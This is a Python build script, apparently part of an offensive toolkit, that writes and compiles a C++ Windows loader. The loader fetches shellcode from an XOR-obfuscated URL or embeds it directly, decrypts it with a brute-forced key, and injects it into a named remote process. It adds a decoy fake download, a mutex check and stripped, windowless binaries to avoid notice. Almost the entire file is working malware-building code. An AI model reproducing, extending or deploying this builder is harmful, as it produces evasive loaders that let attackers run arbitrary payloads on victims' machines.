import os
import time
from Cast.encryptor import *

def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String, xor_key, debug_mode):
    f = open (f"{build_folder}\\main.cpp", "a", encoding="utf-8")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../../Spells/UtilitySpells/FetchFromURL.h"

""")
    if Decoy != "null":
        f.write(f"""
#include "../../Spells/UtilitySpells/FakeDownload.h"
""")   
           
    if Encryption != "null":
        f.write(f"""
#include "../../Spells/EncryptionSpells/{Encryption}"
#include "../../Spells/EncryptionSpells/KeyBrute.h"
""")
        
    if Enumeration != "null":
        f.write(f"""
#include "../../Spells/{Enumeration}"
""")
        
    f.write(f"""
#include "../../Spells/{Loader}"
""")
    if Payload != "null" :
        Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
        f.write(f"""\n
{Payload_Str} 
""")
    
    if Url != "null" :
        f.write(f"""\n
#define XOR_KEY 0x{xor_key:02X}
                
LPCSTR decode_url(const unsigned char* obfuscated_url, int length) {{
    // Allocazione della memoria per la stringa decodificata
    char* decoded_url = (char*)malloc(length + 1);
    if (decoded_url == NULL) {{
        printf("[!] Memory allocation failed.\\n");
        fflush(stdout);
        return NULL;
    }}

    // Decodifica ogni carattere usando XOR
    for (int i = 0; i < length; i++) {{
        decoded_url[i] = obfuscated_url[i] ^ XOR_KEY;
    }}
    decoded_url[length] = '\\0'; // Null-terminate the string

    // Ritorna la stringa decodificata come LPCSTR
    return (LPCSTR)decoded_url;
}}
""")
        
    f.write(f"""\n
using namespace std;
int main()
{{
    printf("[!] Starting.\\n");
    fflush(stdout);
    PBYTE pPayloadAddress;
    SIZE_T pPayloadSize;
""")
    
    if Url != "null":
        f.write(f"""\n        
    {Url}
    int url_length = sizeof(Url) / sizeof(Url[0]);
""")
    
    f.write(f"""\n
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

""")
    if Decoy != "null":
        f.write(f"""\n
    FakeDownload();
""")

    f.write(f"""\n
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "{Control_String}");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	    exit(0);

	// Payload is not running
    hThread = GetCurrentThread();
    """)

    if Url != "null":
        f.write(f"""\n
    LPCSTR decoded_url = decode_url(Url, url_length);
""")

    if Payload != "null":
        f.write(f"""\n
    pPayloadSize = {len(Payload)};
    pPayloadAddress = (PBYTE)malloc(pPayloadSize);
    if (pPayloadAddress == NULL)
    {{
        printf("Memory allocation failed.\\n");
        fflush(stdout);
        return 1;
    }}
    memcpy(pPayloadAddress, Data_RawData, pPayloadSize);
""")

    if Url != "null":
        f.write(f"""\n
    if(!FetchFileFromURLA(decoded_url, &pPayloadAddress, (PDWORD)&pPayloadSize)){{
        printf("Failed to fetch payload");
        fflush(stdout);
        return 0;
    }}
                
    printf("[+] Payload Size: %d\\n", pPayloadSize);
    fflush(stdout);

    """)

    if Enumeration != "null":
        f.write(f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){{
        printf("Failed to find remote process");
        fflush(stdout);
        return 0;
    }}""" ) 
    else:
        pass

    if Encryption != "null":
        f.write(f"""\n
    {get_keyguard()[1]}
    
    #define HINT_BYTE {get_keyguard()[2]}
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, (SIZE_T)pPayloadSize, pbRealKey, sRealKeySize);

""")

    f.write(f"""\n
    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){{
        printf("Failed to execute payload");
        fflush(stdout);
        return 0;
    }}
""")
    if debug_mode == True:
        f.write(f"""\n
    printf("[+] Payload executed.\\n");
    fflush(stdout);
    printf("[+] Payload address: %p\\n", InjectionAddress);
    fflush(stdout);
    printf("[+] Payload size: %d\\n", pPayloadSize);
    fflush(stdout);
    printf("[+] Process ID: %d\\n", dwProcessID);
    fflush(stdout);
    printf("[+] Thread ID: %d\\n", GetThreadId(hThread));
    fflush(stdout);
""")
    
    f.write(f"""\n  
    
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
            
    free(pPayloadAddress);             
            
    return 0;
}}
""")

    f.close()
    time.sleep(2)
    #build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
    if debug_mode == True:
        build = os.system(f"g++ --static -DNO_WINTERNL -w -o {Path} {build_folder}\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32")
    else:
        build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} {build_folder}\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
        os.system(f"strip -o  {Path}.exe {Path}.exe")
    return build
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-DNO_WINTERNL', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

